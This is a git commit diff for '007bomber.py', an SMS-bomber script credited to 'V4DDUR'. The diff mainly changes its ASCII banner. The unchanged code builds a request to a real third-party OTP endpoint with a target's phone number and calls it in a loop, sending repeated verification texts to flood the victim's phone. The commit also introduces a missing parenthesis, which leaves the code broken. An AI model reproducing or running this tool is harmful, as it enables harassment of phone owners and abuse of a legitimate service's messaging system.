7ef75244fb05d31d375761090fe40dfeea08a5a4
mad420-max <78628376+mad420-max@users.noreply.github.com>
2022-01-19 17:47:09 +0600

    Update 007bomber.py

--- 007bomber.py
+++ 007bomber.py
@@ -3,19 +3,22 @@ import time
 import requests
 os.system('clear')
 
-print ("""                            ____    ____  _  _     _______   _______   __    __  .______      
-                            \   \  /   / | || |   |       \ |       \ |  |  |  | |   _  \     
-                             \   \/   /  | || |_  |  .--.  ||  .--.  ||  |  |  | |  |_)  |    
-                              \      /   |__   _| |  |  |  ||  |  |  ||  |  |  | |      /     
-                               \    /       | |   |  '--'  ||  '--'  ||  `--'  | |  |\  \----.
-                                \__/        |_|   |_______/ |_______/  \______/  | _| `._____|
+print ("""                                         _   _    ___ ______ ______  _   _ ______ 
+                                        | | | |  /   ||  _  \|  _  \| | | || ___ \
+                                        | | | | / /| || | | || | | || | | || |_/ /
+                                        | | | |/ /_| || | | || | | || | | ||    / 
+                                        \ \_/ /\___  || |/ / | |/ / | |_| || |\ \ 
+                                         \___/     |_/|___/  |___/   \___/ \_| \_|
+                                                                                  
+                                                                                  
+
                                                                                               
 
 
 
 ------------------------------------------------
- Author   :            V4DDUR
- Facebook :          V4DDUR
+ Author   :           V4DDUR
+ Facebook :         V4DDUR
  GitHub  :             mad420-max
  Version :              1.0
 ------------------------------------------------
@@ -29,4 +32,4 @@ url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=
 for a in range(sms):
 	request.urlopen(url)
 	print(str(a+1)+ "sms send ")
-	time.sleep(30)
+	time.sleep(30
